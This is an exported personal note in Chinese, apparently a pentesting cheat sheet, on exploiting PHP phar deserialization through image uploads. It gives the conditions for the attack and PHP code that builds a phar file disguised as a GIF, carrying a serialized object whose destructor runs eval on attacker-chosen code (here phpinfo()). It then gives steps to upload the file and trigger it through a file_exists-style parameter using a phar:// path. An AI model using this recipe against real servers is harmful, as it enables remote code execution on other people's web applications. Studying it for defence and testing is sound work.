<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>phar上传利用</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>phar上传利用</h1><br/><br />利用前提：<br />1、已知一个类，这个类含有魔术方法<br />2、可以上传图片等到服务器<br />3、文件操作函数可控，没有过滤phar://等字符<br /><br />步骤<br /><br />1、使用php生成phar文件，该文件包含了GIF89a的文件头，伪造图片文件<br />该操作需要本地设置php.ini    phar.readonly = Off，以便于生成phar文件<br /><br /><div class="codebox"><div class="codebox">&lt;?php<br />class&nbsp;AnyClass{<br />&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;$output&nbsp;=&nbsp;&#39;echo&nbsp;&quot;cck&quot;;&#39;;<br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;__destruct()<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eval($this&nbsp;-&gt;&nbsp;output);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br />$phar&nbsp;=&nbsp;new&nbsp;Phar(&#39;phar.phar&#39;);<br />$phar&nbsp;-&gt;&nbsp;stopBuffering();<br />$phar&nbsp;-&gt;&nbsp;setStub(&#39;GIF89a&#39;.&#39;&lt;?php&nbsp;__HALT_COMPILER();?&gt;&#39;);<br />$phar&nbsp;-&gt;&nbsp;addFromString(&#39;test.txt&#39;,&#39;test&#39;);<br />$object&nbsp;=&nbsp;new&nbsp;AnyClass();<br />$object&nbsp;-&gt;&nbsp;output=&nbsp;&#39;phpinfo();&#39;;<br />$phar&nbsp;-&gt;&nbsp;setMetadata($object);<br />$phar&nbsp;-&gt;&nbsp;stopBuffering();</div></div><br /><br />2、将生成的phar文件改成gif后缀<br />3、上传该文件，记录下该文件的相对路径<br />4、找到可以传输文件操作函数的参数页面，比如，某个页面使用了file_exists函数，这个函数的参数是从url里获取的<br />5、设置参数为filename=phar://upload_file/phar.gif，进行访问<br /><br />参考：<br /><a href="https://www.freebuf.com/articles/web/205943.html">https://www.freebuf.com/articles/web/205943.html</a><br /><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>